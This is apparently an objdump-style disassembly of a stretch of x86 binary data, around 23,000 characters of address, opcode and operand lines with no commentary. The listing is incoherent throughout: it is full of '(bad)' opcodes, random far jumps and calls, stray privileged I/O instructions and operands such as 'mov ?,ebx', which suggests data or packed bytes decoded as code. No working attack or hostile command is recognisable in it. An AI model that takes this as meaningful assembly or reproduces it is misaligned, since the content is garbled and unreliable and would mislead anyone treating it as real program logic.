  4213f0:	xchg   ebx,eax
  4213f1:	add    DWORD PTR [esi],ebx
  4213f3:	push   0xaa803704
  4213f8:	sub    al,0x3a
  4213fa:	pushf  
  4213fb:	jge    0x421477
  4213fd:	mov    ds:0x70b7b1ac,eax
  421402:	mov    al,ds:0x4d0e8a6d
  421407:	or     al,0xd6
  421409:	cmp    ah,BYTE PTR [ecx-0xcf47ef1]
  42140f:	retf   
  421410:	(bad)  
  421411:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  421413:	xor    ch,BYTE PTR [edi+0x5c]
  421416:	sbb    bh,BYTE PTR [ecx-0x31aaae6c]
  42141c:	cwde   
  42141d:	adc    ebp,DWORD PTR [edx-0x7e]
  421420:	cdq    
  421421:	push   esi
  421422:	and    esp,DWORD PTR [ebx]
  421424:	add    DWORD PTR [ebp-0x7d],0x69
  421428:	push   esi
  421429:	jle    0x4213e6
  42142b:	jmp    0x838f:0x2ab08715
  421432:	mov    ebp,0x8e6bf9e6
  421437:	sbb    ah,ah
  421439:	push   esi
  42143a:	add    DWORD PTR [esi-0x36a2948f],0x13
  421441:	xchg   ecx,eax
  421442:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421443:	cs loopne 0x421484
  421446:	xchg   ebp,eax
  421447:	mov    ah,0x36
  421449:	dec    eax
  42144a:	jmp    0x89b5:0x89377e78
  421451:	arpl   WORD PTR [eax+0x561662c2],si
  421457:	jns    0x421405
  421459:	imul   edi,DWORD PTR [esi],0x4c
  42145c:	test   al,0xf2
  42145e:	cmp    esp,edx
  421460:	repnz shl DWORD PTR [edi+0x52edb4dd],0xce
  421468:	dec    ebp
  421469:	sub    DWORD PTR [ebx+0x2e],0x58
  42146d:	iret   
  42146e:	adc    eax,0xd8e52a11
  421473:	ds push 0xffffffde
  421476:	cmp    eax,0x94731b47
  42147b:	cli    
  42147c:	push   ecx
  42147d:	adc    BYTE PTR [ebx+0x20],bh
  421480:	les    ecx,FWORD PTR [ebx+0x7e]
  421483:	and    al,bl
  421485:	out    dx,al
  421486:	ss nop
  421488:	pop    ecx
  421489:	sbb    eax,0xe801506d
  42148e:	out    0x3f,al
  421490:	fisttp WORD PTR [ebp+0x76]
  421493:	fstp   QWORD PTR [ecx+ebx*4-0x45]
  421497:	jle    0x42147b
  421499:	push   edx
  42149a:	push   edi
  42149b:	retf   
  42149c:	pop    ebx
  42149d:	push   0x20
  42149f:	nop
  4214a0:	jp     0x421462
  4214a2:	(bad)  
  4214a3:	rcl    BYTE PTR [eax],1
  4214a5:	cmp    ebx,esi
  4214a7:	dec    edi
  4214a8:	loope  0x4214d3
  4214aa:	lods   eax,DWORD PTR ds:[esi]
  4214ab:	shl    DWORD PTR [ebx+0x582f716],0x74
  4214b2:	mov    esi,0xc3a7c1f3
  4214b7:	bound  edx,QWORD PTR [eax]
  4214b9:	nop    esp
  4214bc:	xor    ch,BYTE PTR [edx]
  4214be:	xchg   edi,eax
  4214bf:	push   ecx
  4214c0:	shl    BYTE PTR [eax-0x58420d0],1
  4214c6:	pop    ecx
  4214c7:	add    DWORD PTR [esi+0x52393475],0xffffffdb
  4214ce:	jle    0x42146a
  4214d0:	xor    ecx,eax
  4214d2:	pop    ecx
  4214d3:	je     0x4214cc
  4214d5:	inc    ecx
  4214d6:	out    dx,al
  4214d7:	xchg   ecx,eax
  4214d8:	xchg   ebp,eax
  4214d9:	xlat   BYTE PTR ds:[ebx]
  4214da:	cld    
  4214db:	sbb    edx,DWORD PTR [edx]
  4214dd:	mov    eax,0x2e6681ce
  4214e2:	and    bh,0x3d
  4214e5:	je     0x4214cf
  4214e7:	add    edi,DWORD PTR [ebx]
  4214e9:	clc    
  4214ea:	mov    eax,ds:0x901ec07a
  4214ef:	add    esp,ebp
  4214f1:	push   ecx
  4214f2:	in     al,dx
  4214f3:	pop    ebp
  4214f4:	pop    ebp
  4214f5:	faddp  st(0),st
  4214f7:	dec    ecx
  4214f8:	dec    eax
  4214f9:	and    al,0x66
  4214fb:	jmp    0xfd2ea3df
  421500:	int3   
  421501:	add    eax,eax
  421503:	or     esi,DWORD PTR [eax]
  421505:	ja     0x421566
  421507:	fist   WORD PTR [eax-0x560b7e63]
  42150d:	sub    al,ch
  42150f:	xchg   DWORD PTR [ecx],edi
  421511:	bound  edx,QWORD PTR [edx+edi*1]
  421514:	add    DWORD PTR [eax],0xf0e89490
  42151a:	push   0xd4eda0b2
  42151f:	pop    edi
  421520:	iret   
  421521:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421522:	xchg   BYTE PTR [ebp-0x42ef4fca],ch
  421528:	(bad)  
  421529:	fwait
  42152a:	mov    al,dh
  42152c:	push   ds
  42152d:	jns    0x42153f
  42152f:	addr16 jne 0x4214fa
  421532:	ja     0x4214ce
  421534:	aaa    
  421535:	int3   
  421536:	pop    esi
  421537:	ja     0x42154e
  421539:	pop    ebx
  42153a:	add    eax,0x5be399e0
  42153f:	int3   
  421540:	int    0x72
  421542:	jecxz  0x4214c5
  421544:	shl    DWORD PTR [edi+0x20],1
  421547:	clc    
  421548:	xor    ah,bl
  42154a:	outs   dx,DWORD PTR ds:[esi]
  42154b:	or     ch,BYTE PTR [eax]
  42154d:	pusha  
  42154e:	inc    esp
  42154f:	xor    DWORD PTR [edx-0x7b],ebp
  421552:	sbb    al,0xa4
  421554:	ss pusha 
  421556:	cmp    DWORD PTR [esi],0xffffff94
  421559:	add    DWORD PTR [ebx],ebx
  42155b:	and    edi,DWORD PTR [esi-0x4b0cb6d8]
  421561:	lods   al,BYTE PTR ds:[esi]
  421562:	add    esp,DWORD PTR [edx+0x20aeeb65]
  421568:	push   esi
  421569:	and    DWORD PTR [ecx+ebp*4-0x7c],esi
  42156d:	mov    ah,0x64
  42156f:	or     eax,0xdc60af53
  421574:	push   esp
  421575:	js     0x4215e2
  421577:	repz neg ah
  42157a:	ror    ebp,0x7c
  42157d:	int    0x61
  42157f:	jmp    DWORD PTR [ecx]
  421581:	pop    esp
  421582:	scas   al,BYTE PTR es:[edi]
  421583:	(bad)  
  421585:	xchg   esp,esp
  421587:	push   ecx
  421588:	gs ss push ebx
  42158b:	(bad)
  42158e:	jg     0x42158a
  421590:	add    BYTE PTR [esi+ecx*4+0x3a],dh
  421594:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421595:	push   0x23
  421597:	shl    DWORD PTR [edx+0x2f],1
  42159a:	mov    ah,0xc8
  42159c:	test   eax,0xa076b99b
  4215a1:	cdq    
  4215a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215a3:	adc    DWORD PTR [eax+edx*1+0x46],edx
  4215a7:	dec    eax
  4215a8:	(bad)  [edx-0x55]
  4215ab:	sbb    ebx,DWORD PTR [edx]
  4215ad:	pop    edi
  4215ae:	mov    edi,0x2f1f95c0
  4215b3:	fdiv   QWORD PTR [edx+0x7d96b8c2]
  4215b9:	frstor [edx+edi*2-0x24e08e2c]
  4215c0:	mov    ?,ebx
  4215c2:	sub    al,0x0
  4215c4:	pop    es
  4215c5:	pop    esp
  4215c6:	cli    
  4215c7:	out    dx,al
  4215c8:	popa   
  4215c9:	push   esi
  4215ca:	test   BYTE PTR [esi-0x47],ch
  4215cd:	push   ebx
  4215ce:	(bad)  
  4215cf:	mov    ss,WORD PTR [ebx-0x70e135ca]
  4215d5:	shl    DWORD PTR [ebx],1
  4215d7:	mov    DWORD PTR [edx],ebx
  4215d9:	int3   
  4215da:	(bad)  
  4215dc:	mov    edi,0x554ebe2c
  4215e1:	pop    eax
  4215e2:	pop    ecx
  4215e3:	add    eax,0xcc840726
  4215e8:	loope  0x42158e
  4215ea:	mov    al,ds:0x2eb67106
  4215ef:	call   0x9183888c
  4215f4:	test   cl,0xca
  4215f7:	xchg   esp,eax
  4215f8:	pop    ds
  4215f9:	cli    
  4215fa:	fs mov ah,0xec
  4215fd:	cld    
  4215fe:	pop    ss
  4215ff:	push   esi
  421600:	iret   
  421601:	or     ecx,DWORD PTR [eax-0x4d]
  421604:	cmc    
  421605:	(bad)  
  421606:	mov    dl,0xe7
  421608:	mov    ebp,0xe652b037
  42160d:	jecxz  0x4215f9
  42160f:	or     DWORD PTR [edx],esi
  421611:	je     0x421616
  421613:	xor    ch,BYTE PTR [ebx+0x5e]
  421616:	dec    edi
  421617:	addr16 pusha 
  421619:	jg     0x4215ba
  42161b:	mov    DWORD PTR [edx],esp
  42161d:	jbe    0x421601
  42161f:	lods   eax,DWORD PTR ds:[esi]
  421620:	enter  0xdf9c,0x23
  421624:	lods   al,BYTE PTR ds:[esi]
  421625:	sub    eax,0xe676bcda
  42162a:	fidiv  WORD PTR cs:[esi+0x398c6cef]
  421631:	lods   al,BYTE PTR ds:[esi]
  421632:	popf   
  421633:	test   DWORD PTR [ebp+0x7e],edi
  421636:	shl    BYTE PTR ds:0xc705c264,cl
  42163c:	xlat   BYTE PTR ds:[ebx]
  42163d:	inc    esi
  42163e:	jmp    0x568502e1
  421643:	lds    eax,FWORD PTR [ecx-0x3c]
  421646:	enter  0xf6f9,0xc
  42164a:	add    eax,0x642dd59c
  42164f:	fldln2 
  421651:	pop    ds
  421652:	sub    bh,bl
  421654:	sub    ebp,DWORD PTR [esi+0x3123983c]
  42165a:	xor    DWORD PTR [edi],0x75
  42165d:	loopne 0x421668
  42165f:	into   
  421660:	lods   al,BYTE PTR ds:[esi]
  421661:	mov    bh,0x76
  421663:	cmp    eax,esp
  421665:	cmp    BYTE PTR [esi-0x5c],0x94
  421669:	js     0x421690
  42166b:	scas   eax,DWORD PTR es:[edi]
  42166c:	(bad)  
  42166d:	mov    WORD PTR [edi+0x317db06d],fs
  421673:	xchg   ebp,eax
  421674:	push   es
  421675:	imul   edi,DWORD PTR [edi+ebx*4],0x425178d
  42167c:	mov    DWORD PTR [ecx+ecx*2-0x52d1b62e],eax
  421683:	mov    es,WORD PTR [ebp-0x21]
  421686:	loopne 0x421624
  421688:	push   esi
  421689:	aaa    
  42168a:	sub    bl,BYTE PTR [edx-0x8]
  42168d:	jns    0x4216b8
  42168f:	push   eax
  421690:	pop    ss
  421691:	rol    BYTE PTR [esi],0xf7
  421694:	frstor [eax-0x3]
  421697:	in     eax,0xff
  421699:	scas   eax,DWORD PTR es:[edi]
  42169a:	ret    
  42169b:	mov    DWORD PTR [ebx+edi*8-0x60],ebx
  42169f:	fs cli 
  4216a1:	jmp    0xa8ad:0x2359eb95
  4216a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216a9:	mov    ss,WORD PTR [ecx-0x3a]
  4216ac:	add    eax,0x4cf2f441
  4216b1:	ins    DWORD PTR es:[edi],dx
  4216b2:	leave  
  4216b3:	not    DWORD PTR [edx]
  4216b5:	call   0x524d1448
  4216ba:	jmp    0x4365ef55
  4216bf:	ror    DWORD PTR [edx],1
  4216c1:	inc    eax
  4216c2:	push   edi
  4216c3:	mov    fs,WORD PTR [edi+0x17]
  4216c6:	and    esp,DWORD PTR [ecx+0x31]
  4216c9:	add    edi,ecx
  4216cb:	sbb    ebx,ecx
  4216cd:	sub    DWORD PTR [esi+0x5e],esi
  4216d0:	cmp    BYTE PTR [esi+0x3a501f89],cl
  4216d6:	dec    ecx
  4216d7:	or     al,0x4a
  4216d9:	adc    BYTE PTR [eax+0x4446e028],cl
  4216df:	push   esp
  4216e0:	cs push esp
  4216e2:	mov    edi,0x885e45cc
  4216e7:	fistp  WORD PTR [bx+di]
  4216ea:	push   eax
  4216eb:	fisttp QWORD PTR [ebp-0x17]
  4216ee:	aam    0xea
  4216f0:	xchg   ebx,eax
  4216f1:	stos   BYTE PTR es:[edi],al
  4216f2:	or     eax,0x4930ef97
  4216f7:	outs   dx,DWORD PTR ds:[esi]
  4216f8:	(bad)  
  4216f9:	les    ecx,FWORD PTR [eax-0x64]
  4216fc:	sub    ch,bh
  4216fe:	jmp    0x49d281e
  421703:	mov    esi,DWORD PTR [ebx+0x2f6db46b]
  421709:	mov    ecx,0xc6be1049
  42170e:	pushf  
  42170f:	(bad)  fs:[ecx-0x67]
  421713:	cmp    BYTE PTR [esi],dh
  421715:	enter  0x68e2,0x2d
  421719:	xor    DWORD PTR [edx+0x369eecc6],edi
  42171f:	pushf  
  421720:	mov    ah,0x5
  421722:	mov    al,ds:0x71953f50
  421727:	cmp    eax,0x5af98f8f
  42172c:	and    eax,0x560f4f20
  421731:	sub    al,BYTE PTR [ebp+0x6f]
  421734:	add    DWORD PTR [ebx],ebx
  421736:	leave  
  421737:	sub    ebp,edx
  421739:	mov    ch,0x5
  42173b:	pop    esp
  42173c:	fcmovu st,st(6)
  42173e:	outs   dx,DWORD PTR ds:[esi]
  42173f:	adc    bh,BYTE PTR [esi-0x44fb01d6]
  421745:	jb     0x421763
  421747:	loope  0x4216ed
  421749:	push   0xffffffc3
  42174b:	fxam   
  42174d:	jmp    0x3833:0x282cd9ba
  421754:	test   al,0x6
  421756:	mov    esp,0x1d10a219
  42175b:	cdq    
  42175c:	push   ecx
  42175d:	jns    0x421774
  42175f:	cli    
  421760:	push   eax
  421761:	cmp    eax,0x325967e9
  421766:	cs fadd st,st(3)
  421769:	lock sbb bh,BYTE PTR [ebp+esi*1-0x74]
  42176e:	js     0x421763
  421770:	or     BYTE PTR [ecx],cl
  421772:	jl     0x421743
  421774:	push   cs
  421775:	jl     0x4217af
  421777:	pop    edx
  421778:	aad    0xb2
  42177a:	inc    eax
  42177b:	ins    DWORD PTR es:[edi],dx
  42177c:	popf   
  42177d:	inc    ebx
  42177e:	data16 sub BYTE PTR [edx-0xe307783],bh
  421785:	clc    
  421786:	sbb    DWORD PTR [eax],edi
  421788:	das    
  421789:	in     al,0xcf
  42178b:	add    al,0x52
  42178d:	int    0xa6
  42178f:	test   BYTE PTR [ebx+0x18],ah
  421792:	mov    ?,WORD PTR [edi-0x4c]
  421795:	les    ebx,FWORD PTR [edi-0x28]
  421798:	fcomp  QWORD PTR [ecx+0x70]
  42179b:	sbb    eax,0x4d494711
  4217a0:	and    BYTE PTR [edx-0x46dc0ba0],al
  4217a6:	jnp    0x421747
  4217a8:	scas   al,BYTE PTR es:[edi]
  4217a9:	mov    bh,0x39
  4217ab:	ja     0x4217dc
  4217ad:	retf   0x10d3
  4217b0:	and    DWORD PTR [edx+0x1d13919],ebp
  4217b6:	das    
  4217b7:	rcl    BYTE PTR [ebp+0x40ff3f1c],cl
  4217bd:	(bad)  
  4217be:	daa    
  4217bf:	test   bh,dl
  4217c1:	add    eax,esi
  4217c3:	stc    
  4217c4:	add    edi,DWORD PTR [esi+0x3]
  4217c7:	push   es
  4217c8:	xor    bl,BYTE PTR [eax-0x5f]
  4217cb:	jg     0x4217b3
  4217cd:	cli    
  4217ce:	mov    al,ds:0xcc29c5e2
  4217d3:	or     eax,DWORD PTR [eax-0x61]
  4217d6:	inc    ebx
  4217d7:	cmp    al,0xb9
  4217d9:	dec    edi
  4217da:	mov    dh,0x10
  4217dc:	jmp    0x421771
  4217de:	add    esi,0x6d
  4217e1:	pop    ebx
  4217e2:	sti    
  4217e3:	xchg   ebp,eax
  4217e4:	leave  
  4217e5:	xchg   BYTE PTR [ebx+0x20],dl
  4217e8:	push   ds
  4217e9:	(bad)  
  4217ea:	inc    eax
  4217eb:	mov    esi,0x1927dea1
  4217f0:	xor    eax,0x108d141e
  4217f5:	shl    ebx,cl
  4217f7:	test   al,0x0
  4217f9:	popf   
  4217fa:	int3   
  4217fb:	xor    al,0x38
  4217fd:	push   cs
  4217fe:	ret    0x69d8
  421801:	sub    DWORD PTR [edi],esp
  421803:	mov    esi,0x6f721963
  421808:	mov    edi,0x7fd13d12
  42180d:	jle    0x4217c2
  42180f:	push   esp
  421810:	sub    eax,0x2c9927f7
  421815:	adc    esi,0xffffff8d
  421818:	mov    eax,ebx
  42181a:	test   eax,0x60bf52d0
  42181f:	retf   
  421820:	scas   eax,DWORD PTR es:[edi]
  421821:	push   cs
  421822:	fidivr WORD PTR [eax]
  421824:	cmc    
  421825:	cmp    eax,0x8f7c96a1
  42182a:	mov    ebx,DWORD PTR [esi*2-0x53c892a3]
  421831:	inc    ecx
  421832:	cld    
  421833:	cmp    DWORD PTR [esi+0x3a],edi
  421836:	les    ebp,FWORD PTR ds:0x5a623be
  42183c:	in     al,dx
  42183d:	jb     0x42180f
  42183f:	cld    
  421840:	dec    esi
  421841:	daa    
  421842:	mov    eax,DWORD PTR [esi+0x59144]
  421848:	add    BYTE PTR ds:0xc40853fc,0xf2
  42184f:	inc    eax
  421850:	fbld   TBYTE PTR [eax-0x62]
  421853:	fwait
  421854:	repz inc edx
  421856:	cdq    
  421857:	loop   0x421874
  421859:	fldcw  WORD PTR [ebp+0x71]
  42185c:	dec    ecx
  42185d:	inc    esp
  42185e:	lods   al,BYTE PTR ds:[esi]
  42185f:	jns    0x4218c2
  421861:	jecxz  0x421818
  421863:	loope  0x421834
  421865:	pop    ecx
  421866:	mov    ds:0x1b8f05d7,al
  42186b:	push   esi
  42186c:	(bad)  
  42186d:	sub    eax,0x74ca0f47
  421872:	mov    bh,BYTE PTR [ebp+edi*4+0x1e]
  421876:	mov    ds:0xa3c4917a,eax
  42187b:	xchg   edi,eax
  42187c:	(bad)  
  42187e:	xchg   ebx,eax
  42187f:	or     bh,BYTE PTR [eax+0x3baf2344]
  421885:	push   0x1e
  421887:	pop    ecx
  421888:	cmp    ch,BYTE PTR [eax]
  42188a:	inc    edi
  42188b:	or     dl,BYTE PTR [edx+ebp*4-0x5a7175be]
  421892:	push   DWORD PTR [ebp+0x43723455]
  421898:	cmp    BYTE PTR ds:0x9044a1eb,bh
  42189e:	pop    ebp
  42189f:	xchg   ebp,eax
  4218a0:	dec    ecx
  4218a1:	xor    eax,0x655f11dc
  4218a6:	cmp    ah,bh
  4218a8:	mul    DWORD PTR [edx]
  4218aa:	pop    esi
  4218ab:	add    ebp,DWORD PTR [edi+0x8]
  4218ae:	pusha  
  4218af:	js     0x42191b
  4218b1:	shl    DWORD PTR [ebx],cl
  4218b3:	daa    
  4218b4:	(bad)  
  4218b5:	or     al,0xa2
  4218b7:	add    DWORD PTR [ebp+0x50],esp
  4218ba:	mov    ah,0x8d
  4218bc:	loopne 0x4218dc
  4218be:	push   ss
  4218bf:	arpl   WORD PTR [edx+0x700ffeeb],dx
  4218c5:	lahf   
  4218c6:	popf   
  4218c7:	mov    dh,ch
  4218c9:	mov    ah,0xb1
  4218cb:	retf   
  4218cc:	nop
  4218cd:	shr    DWORD PTR [ecx-0x34],cl
  4218d0:	inc    ebp
  4218d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218d2:	in     eax,dx
  4218d3:	or     al,BYTE PTR [ebp+0x328ca1c2]
  4218d9:	mov    esp,0x1f34d16d
  4218de:	push   ebx
  4218df:	scas   eax,DWORD PTR es:[edi]
  4218e0:	xlat   BYTE PTR ds:[ebx]
  4218e1:	jl     0x42186f
  4218e3:	inc    ecx
  4218e4:	imul   esp,esp,0xffffffbb
  4218e7:	pop    ecx
  4218e8:	loope  0x421930
  4218ea:	outs   dx,BYTE PTR ds:[esi]
  4218eb:	lahf   
  4218ec:	sub    bh,bl
  4218ee:	(bad)  
  4218ef:	das    
  4218f0:	and    BYTE PTR [edi-0x1],bl
  4218f3:	jmp    0x421897
  4218f5:	or     eax,DWORD PTR [ecx]
  4218f7:	pop    ss
  4218f8:	push   cs
  4218f9:	in     eax,0x1
  4218fb:	je     0x4218f9
  4218fd:	fsubr  st,st(2)
  4218ff:	lock (bad) 
  421901:	mov    ebx,esp
  421903:	scas   al,BYTE PTR es:[edi]
  421904:	popf   
  421905:	inc    ebp
  421906:	in     al,0x1
  421908:	sub    BYTE PTR [edi],dl
  42190a:	inc    ebp
  42190b:	and    edi,DWORD PTR [esi-0x3e]
  42190e:	or     BYTE PTR ss:[edi],bl
  421911:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421912:	mov    ds:0x25ba198c,al
  421917:	mov    ebx,0xf55b17a6
  42191c:	sub    esp,DWORD PTR [eax]
  42191e:	lock adc BYTE PTR [edx+edx*4+0x7f],ch
  421923:	inc    ebp
  421924:	jp     0x4218cd
  421926:	pusha  
  421927:	or     ecx,esi
  421929:	pop    esi
  42192a:	cmp    BYTE PTR ds:[edx],0xd5
  42192e:	push   esi
  42192f:	xor    BYTE PTR [ebx+eax*8+0x17],al
  421933:	ja     0x4218f6
  421935:	out    dx,eax
  421936:	mov    al,dl
  421938:	jne    0x4218ed
  42193a:	mov    dl,0x74
  42193c:	jmp    0x55c32089
  421941:	leave  
  421942:	fsub   DWORD PTR [esi+edx*4-0x4d]
  421946:	repnz fnsave [eax]
  421949:	or     ecx,DWORD PTR [ebx]
  42194b:	mov    ebp,ebx
  42194d:	dec    ebp
  42194e:	add    al,0xf3
  421950:	shl    DWORD PTR [edx],0x45
  421953:	adc    ah,BYTE PTR [eax+0x69]
  421956:	cmp    esp,DWORD PTR [ecx-0x5b]
  421959:	or     BYTE PTR [eax+0xfffb226],0xe3
  421960:	shl    DWORD PTR [esp+edx*1],cl
  421963:	arpl   WORD PTR [edx+0x5],sp
  421966:	pusha  
  421967:	xchg   ebp,eax
  421968:	xchg   edi,eax
  421969:	retf   0xe732
  42196c:	xor    eax,0x54030d17
  421971:	sub    al,0x6c
  421973:	dec    eax
  421974:	js     0x4219c8
  421976:	mov    al,0x31
  421978:	pop    es
  421979:	test   BYTE PTR [ebx+0x2dbf9b96],dl
  42197f:	shl    BYTE PTR [edx],0x91
  421982:	sub    al,0xc4
  421984:	repz hlt 
  421986:	pop    esi
  421987:	push   es
  421988:	inc    esp
  421989:	push   0x629435d4
  42198e:	dec    edx
  42198f:	mov    dl,0xe2
  421991:	icebp  
  421992:	aad    0x48
  421994:	dec    edi
  421995:	add    edi,DWORD PTR [esi+0x38b3b2fc]
  42199b:	out    0x44,eax
  42199d:	fist   WORD PTR [ecx-0x11850686]
  4219a3:	dec    edx
  4219a4:	ret    0xd0d4
  4219a7:	add    eax,0xe0349cf3
  4219ac:	cmp    eax,0xe4564362
  4219b1:	mov    al,0x17
  4219b3:	call   0xfea:0x100ca06f
  4219ba:	mov    al,ds:0x813dae3d
  4219bf:	(bad)  [ebp-0x25]
  4219c2:	cmc    
  4219c3:	pop    edx
  4219c4:	les    esp,FWORD PTR [edx+edx*8+0x32]
  4219c8:	test   DWORD PTR [esi+0x50ebcd],edx
  4219ce:	jmp    0x9a8:0xc9b7cb43
  4219d5:	dec    eax
  4219d6:	xor    edx,esp
  4219d8:	cmp    al,0x55
  4219da:	rcl    edi,0x38
  4219dd:	bound  edi,QWORD PTR [esi+0x5d42e44a]
  4219e3:	sub    bh,bl
  4219e5:	lods   eax,DWORD PTR ds:[esi]
  4219e6:	mov    esp,0xf97712db
  4219eb:	push   edx
  4219ec:	pop    eax
  4219ed:	jmp    0x5c61:0x6fe903e0
  4219f4:	ja     0x4219fc
  4219f6:	mov    ds,WORD PTR [ecx+ebx*2]
  4219f9:	sub    BYTE PTR [eax],al
  4219fb:	stos   DWORD PTR es:[edi],eax
  4219fc:	cmovg  eax,DWORD PTR [eax+0x45ffde90]
  421a03:	xor    al,0x9
  421a05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a06:	and    al,0xea
  421a08:	dec    edx
  421a09:	lods   al,BYTE PTR ds:[esi]
  421a0a:	push   edi
  421a0b:	xchg   ebp,eax
  421a0c:	xor    DWORD PTR [esi+0x34f94f81],ecx
  421a12:	shl    dl,cl
  421a14:	jne    0x421a04
  421a16:	inc    ecx
  421a17:	in     eax,0xb8
  421a19:	mov    bl,0x18
  421a1b:	pop    ecx
  421a1c:	cmp    bh,BYTE PTR [edx+0x6a]
  421a1f:	push   ebx
  421a20:	xor    BYTE PTR [esi+0x69b83a8c],dl
  421a26:	das    
  421a27:	push   ebx
  421a28:	xor    dh,BYTE PTR ds:0x32b7676b
  421a2e:	scas   al,BYTE PTR es:[edi]
  421a2f:	iret   
  421a30:	inc    edi
  421a31:	inc    edi
  421a32:	dec    edx
  421a33:	inc    edx
  421a34:	cdq    
  421a35:	inc    edi
  421a36:	xchg   ebx,eax
  421a37:	xchg   DWORD PTR [ebx-0x45],ebp
  421a3a:	mov    bh,0x7a
  421a3c:	pushw  es
  421a3e:	push   es
  421a3f:	int3   
  421a40:	push   edx
  421a41:	pop    edx
  421a42:	pop    esp
  421a43:	inc    edx
  421a44:	xchg   ebp,eax
  421a45:	test   eax,0x93310513
  421a4a:	mov    ebp,0xe0ccd7ae
  421a4f:	mov    al,0x3a
  421a51:	push   ecx
  421a52:	cmp    BYTE PTR [edi-0x2e],ah
  421a55:	mov    bh,0x62
  421a57:	mov    bl,BYTE PTR [ebp+0x2a]
  421a5a:	cwde   
  421a5b:	sbb    eax,0xf407c319
  421a60:	sbb    BYTE PTR [ebp-0x7c],ch
  421a63:	ret    0xf259
  421a66:	cmp    eax,0x17d1f1e7
  421a6b:	enter  0x5a8a,0xa3
  421a6f:	inc    edi
  421a70:	sub    DWORD PTR [edi+0x21],ebx
  421a73:	lods   eax,DWORD PTR ds:[esi]
  421a74:	das    
  421a75:	neg    DWORD PTR [eax-0x50bff645]
  421a7b:	inc    eax
  421a7c:	ficomp DWORD PTR [ebp-0xe7a5f90]
  421a82:	pop    ebx
  421a83:	cs test al,0x96
  421a86:	pushf  
  421a87:	and    bl,bh
  421a89:	pop    edi
  421a8a:	mov    edx,0x19edf810
  421a8f:	cmp    esp,DWORD PTR [ecx+esi*2-0x5d7dc14e]
  421a96:	xor    esi,DWORD PTR gs:[ebx-0x40d2f1fd]
  421a9d:	mov    ebx,eax
  421a9f:	pushf  
  421aa0:	cwde   
  421aa1:	or     edx,eax
  421aa3:	jbe    0x421a70
  421aa5:	add    ebx,esi
  421aa7:	inc    ebx
  421aa8:	sar    DWORD PTR [ebx-0x7bf56fbc],1
  421aae:	test   al,0xe0
  421ab0:	jmp    0x8a78ffc2
  421ab5:	das    
  421ab6:	in     eax,dx
  421ab7:	scas   eax,DWORD PTR es:[edi]
  421ab8:	or     ebp,DWORD PTR [ecx+0x298987c7]
  421abe:	call   0x1e18194c
  421ac3:	mov    ebx,0x243f96b2
  421ac8:	jecxz  0x421a9d
  421aca:	hlt    
  421acb:	xchg   esi,eax
  421acc:	mov    ds:0x89f84035,eax
  421ad1:	jg     0x421a8b
  421ad3:	pop    edx
  421ad4:	fisttp WORD PTR [ecx]
  421ad6:	add    DWORD PTR [eax-0x5f],0x12
  421ada:	aam    0x27
  421adc:	mul    BYTE PTR [eax+0x1e638086]
  421ae2:	xor    BYTE PTR [eax-0x58],0x63
  421ae6:	xchg   DWORD PTR [edi-0x3f],esp
  421ae9:	adc    esi,edx
  421aeb:	push   0x2cdc83e5
  421af0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421af1:	int3   
  421af2:	adc    BYTE PTR [ebx],bh
  421af4:	ja     0x421aeb
  421af6:	fcomp  QWORD PTR [ecx]
  421af8:	pop    eax
  421af9:	loop   0x421a91
  421afb:	aaa    
  421afc:	(bad)  
  421afd:	jmp    0x66578de2
  421b02:	lock push 0xd8f22c1
  421b08:	rol    edx,0xb1
  421b0b:	sub    ecx,DWORD PTR [ebx-0x633e0a7d]
  421b11:	adc    dh,dl
  421b13:	jb     0x421afb
  421b15:	sbb    BYTE PTR ds:0xeca4ed43,0x52
  421b1c:	cmp    eax,0x55d7e975
  421b21:	pop    es
  421b22:	std    
  421b23:	jno    0x421b88
  421b25:	xor    eax,0xfcc2943f
  421b2a:	jg     0x421b1d
  421b2c:	in     al,dx
  421b2d:	xor    DWORD PTR [ebx+0x62ce9907],ebp
  421b33:	adc    al,0x7c
  421b35:	and    edi,edi
  421b37:	gs mov edx,0x131e47f6
  421b3d:	adc    DWORD PTR [edx],ebp
  421b3f:	icebp  
  421b40:	and    eax,ebx
  421b42:	cld    
  421b43:	or     DWORD PTR [edx+0x39],0x8ae87424
  421b4a:	xor    al,0xfa
  421b4c:	aas    
  421b4d:	or     dh,0x59
  421b50:	scas   al,BYTE PTR es:[edi]
  421b51:	sbb    esp,DWORD PTR es:[ebp-0x5ed61fa9]
  421b58:	xor    BYTE PTR [ecx],dl
  421b5a:	xchg   esp,eax
  421b5b:	into   
  421b5c:	in     eax,dx
  421b5d:	xchg   esp,eax
  421b5e:	aam    0xcf
  421b60:	inc    ebp
  421b61:	xchg   ecx,eax
  421b62:	out    dx,eax
  421b63:	test   eax,0x3dd47d85
  421b68:	mov    ds,WORD PTR [eax-0x1d]
  421b6b:	mov    edi,0xa0096928
  421b70:	push   ebx
  421b71:	push   ecx
  421b72:	in     eax,dx
  421b73:	push   eax
  421b74:	out    dx,eax
  421b75:	in     al,0xc4
  421b77:	loop   0x421b02
  421b79:	jbe    0x421bba
  421b7b:	aad    0xe0
  421b7d:	mov    al,0xd
  421b7f:	adc    DWORD PTR [eax+0x14],esi
  421b82:	cmp    ebx,ebx
  421b84:	and    eax,0x3004e215
  421b89:	loopne 0x421bf8
  421b8b:	push   ecx
  421b8c:	add    eax,0x826ccab2
  421b91:	xchg   esi,eax
  421b92:	pop    DWORD PTR [eax]
  421b94:	and    eax,0x465a8160
  421b99:	push   esi
  421b9a:	cmc    
  421b9b:	cmc    
  421b9c:	and    DWORD PTR [eax-0x23],esp
  421b9f:	xor    eax,0xa3f24940
  421ba4:	jne    0x421b5d
  421ba6:	mov    ch,BYTE PTR [esi]
  421ba8:	pop    ds
  421ba9:	loopne 0x421b53
  421bab:	xchg   ebx,eax
  421bac:	retfw  
  421bae:	vorps  ymm7,ymm3,YMMWORD PTR [ebp-0x52]
  421bb3:	pop    es
  421bb4:	mov    esp,0x10e1cb18
  421bb9:	test   BYTE PTR [eax],ah
